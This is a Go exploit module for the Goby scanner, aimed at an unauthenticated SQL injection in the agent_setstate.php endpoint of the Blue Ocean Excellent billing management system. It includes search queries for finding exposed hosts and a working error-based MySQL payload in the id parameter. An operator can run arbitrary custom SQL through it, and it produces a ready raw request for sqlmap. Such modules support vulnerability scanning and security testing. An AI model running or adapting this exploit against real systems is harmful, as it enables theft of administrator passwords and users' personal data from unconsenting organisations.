package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Blue Ocean Excellent Billing Management System /agent_setstate.php SQL Injection Vulnerability",
    "Description": "<p>Blue Ocean Excellent Billing Management System is a network security operation management system based on network operation, focusing on enhancing global security, and improving management efficiency, providing a \"highly secure, operable, and easy-to-manage\" operation and management experience, developed based on the standard RADIUS protocol, which not only supports PPPOE and WEB authentication billing. It also supports 802.1X access control technology, which is compatible with products from other manufacturers that support corresponding standards, and combines with Blue Ocean's excellent PPPOE server gateway to provide more abundant functions. </p><p>In addition, the friendly way of Web access management provides users with a better and easier to use way, and a more intimate form of use.In addition to the SQL injection vulnerability in the agent_setstate.php interface of Blue Ocean Excellent Billing Management System, an unauthenticated malicious attacker can exploit the SQL injection vulnerability to obtain information in the database (such as administrator background password, site user personal information), and the attacker can even write commands to the server with high privilege to further obtain server system permissions.</p>",
    "Product": "Blue Ocean Excellent Billing Management System",
    "Homepage": "http://www.natshell.com/list-1-1.html",
    "DisclosureDate": "2024-05-24",
    "PostTime": "2024-11-05",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "title=\"蓝海卓越计费管理系统\" && body=\"login_check.php\"",
    "GobyQuery": "title=\"蓝海卓越计费管理系统\" && body=\"login_check.php\"",
    "Level": "1",
    "Impact": "<p>In addition, the friendly way of Web access management provides users with a better and easier to use way, and a more intimate form of use. In addition to the SQL injection vulnerability in the agent_setstate.php interface of Blue Ocean Excellent Billing Management System, an unauthenticated malicious attacker can exploit the SQL injection vulnerability to obtain information in the database (such as administrator background password, site user personal information), and the attacker can even write commands to the server with high privilege to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/139172595"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "db_name,db_version,user_name",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "select version()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "蓝海卓越计费管理系统 /agent_setstate.php SQL 注入漏洞",
            "Product": "蓝海卓越计费管理系统",
            "Description": "<p>蓝海卓越计费管理系统是一套以实现网络运营为基础，增强全局安全为中心，提高管理效率为目的的网络安全运营管理系统，提供“高安全、可运营、易管理”的运营管理体验，基于标准的RADIUS协议开发，它不仅支持PPPOE和WEB认证计费，还支持802.1X接入控制技术，与其他厂商支持相应标准的产品兼容，结合蓝海卓越的PPPOE服务器网关，可提供更加丰富的功能。，另外，友好的Web访问管理的方式，为用户提供更好用、易用的方式，更贴心的使用形式。<br></p><p>蓝海卓越计费管理系统 agent_setstate.php 接口存在SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、部署Web应用防火墙，对数据库操作进行监控。</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>蓝海卓越计费管理系统 agent_setstate.php 接口存在SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Blue Ocean Excellent Billing Management System /agent_setstate.php SQL Injection Vulnerability",
            "Product": "Blue Ocean Excellent Billing Management System",
            "Description": "<p>Blue Ocean Excellent Billing Management System is a network security operation management system based on network operation, focusing on enhancing global security, and improving management efficiency, providing a \"highly secure, operable, and easy-to-manage\" operation and management experience, developed based on the standard RADIUS protocol, which not only supports PPPOE and WEB authentication billing. It also supports 802.1X access control technology, which is compatible with products from other manufacturers that support corresponding standards, and combines with Blue Ocean's excellent PPPOE server gateway to provide more abundant functions.&nbsp;</p><p>In addition, the friendly way of Web access management provides users with a better and easier to use way, and a more intimate form of use.In addition to the SQL injection vulnerability in the agent_setstate.php interface of Blue Ocean Excellent Billing Management System, an unauthenticated malicious attacker can exploit the SQL injection vulnerability to obtain information in the database (such as administrator background password, site user personal information), and the attacker can even write commands to the server with high privilege to further obtain server system permissions.<br></p>",
            "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>In addition, the friendly way of Web access management provides users with a better and easier to use way, and a more intimate form of use. In addition to the SQL injection vulnerability in the agent_setstate.php interface of Blue Ocean Excellent Billing Management System, an unauthenticated malicious attacker can exploit the SQL injection vulnerability to obtain information in the database (such as administrator background password, site user personal information), and the attacker can even write commands to the server with high privilege to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9968"
}`
	setSqlPayloadHashsjabfsjcvasbhcgabgfhafsafasflhyehsnhhkrybsvuhhucndsbgj := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, sqlUrl string, head map[string]string) (*httpclient.HttpResponse, error) {
			//对sql进行url编码
			sql = `(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a767071,(` + sql + `),0x7170716a71,0x78))s), 8446744073709551610, 8446744073709551610)))`
			sql = url.QueryEscape(sql)
			postRequest := httpclient.NewGetRequestConfig(sqlUrl + "?id=" + sql)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		urlget := "/agent_setstate.php"

		resp, err = setGetRequest(hostInfo, urlget, map[string]string{})
		if err != nil || resp.StatusCode != 200 {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/agent_setstate.php"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "8ebb81fcca5cd991bbec70f8907d78aa"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `select md5('ahscuasgvc')`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `qzvpq([\s\S]*?)qpqjqx`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashsjabfsjcvasbhcgabgfhafsafasflhyehsnhhkrybsvuhhucndsbgj
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if output, err := makeRegular(resp.RawBody, regular); err != nil || !strings.Contains(output, content) {
				return false
			}
			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			// expResult.HostInfo.HostInfo
			sqlpoint := `GET /agent_setstate.php?id=(SELECT%202*(IF((SELECT%20*%20FROM%20(SELECT%20CONCAT(0x717a767071,(select%20'1'),0x7170716a71,0x78))s),%208446744073709551610,%208446744073709551610))) HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Content-Type: application/x-www-form-urlencoded
Connection: close`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `qzvpq([\s\S]*?)qpqjqx`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashsjabfsjcvasbhcgabgfhafsafasflhyehsnhhkrybsvuhhucndsbgj
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "custom" || attacktype == "default" {
				sql := ""
				if attacktype == "custom" {
					sql = goutils.B2S(ss.Params["custom"])
				} else {
					way := goutils.B2S(ss.Params["default"])
					if way == "db_name" {
						sql = "select database()"
					} else if way == "db_version" {
						sql = "select version()"
					} else if way == "user_name" {
						sql = "select user()"
					}
				}
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
					return expResult
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
